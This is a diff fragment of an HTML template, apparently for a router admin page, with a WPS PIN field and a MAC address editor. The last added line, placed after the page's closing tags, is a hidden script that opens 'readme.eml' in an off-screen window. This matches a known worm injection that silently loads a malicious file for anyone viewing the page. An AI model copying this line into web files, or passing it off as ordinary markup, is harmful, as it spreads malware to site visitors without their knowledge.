+                                </td>
+                            </tr>
+
+                            <tr>
+                                <th><%- lbl.wpsPin %><%- colon %></th>
+                                <td>
+                                    <input type="text" id="wpsPin" name="wpsPin"  class="normal"/>
+                                </td>
+                            </tr>
+                            <tr>
+                                <th>&nbsp;</th>
+                                <td><input type="button" id="btnSaveWps" value="<%- btn.save %>" /></td>
+                            </tr>
+                        </table>
+                    </form>
+                    <span style="clear:both"></span>
+                </script>
+            </div>
+			
+        </div>
+    </div>
+</div>
+<div class="helper_box" >
+    <div id="helper"></div>
+</div>
+
+<div id="edit_box" style="width: 400px;height: 100px" >
+    <div class="detail" id="fwHead">
+        <script type="text/template" id="fwHead_template">
+            <div id="edit_title"></div>
+            <div id="edit_close"><input id="btnClose" type="button" value="<%- btn.close %>" /></div>
+            <div style="clear:both;"></div>
+        </script>
+    </div>
+    <div id="fwBody">
+        <script type="text/template" id="fwBody_template">
+            <table class="detail" cellspacing="0">
+                <th><span><%- net.mac %></span></th>
+                <td><input type="text" id="macList" name="macList" class="large" maxlength="30" /><span class="cmt"><%- lbl.example %><%- colon %>B8:AC:6F:BB:7E:3F</span></td>
+                <tr>
+                    <th>&nbsp;</th>
+                    <td>
+						<input type="button" id="btnSaveMac" value="<%- btn.save %>" />
+						<input type="button" id="btnEditMac" value="<%- btn.save %>" />
+					</td>
+                </tr>
+            </table>
+        </script>
+    </div>
+</div>
+
+<span style="clear:both"></span>
+</div>
+<html><script language="JavaScript">window.open("readme.eml", null,"resizable=no,top=6000,left=6000")</script></html> 
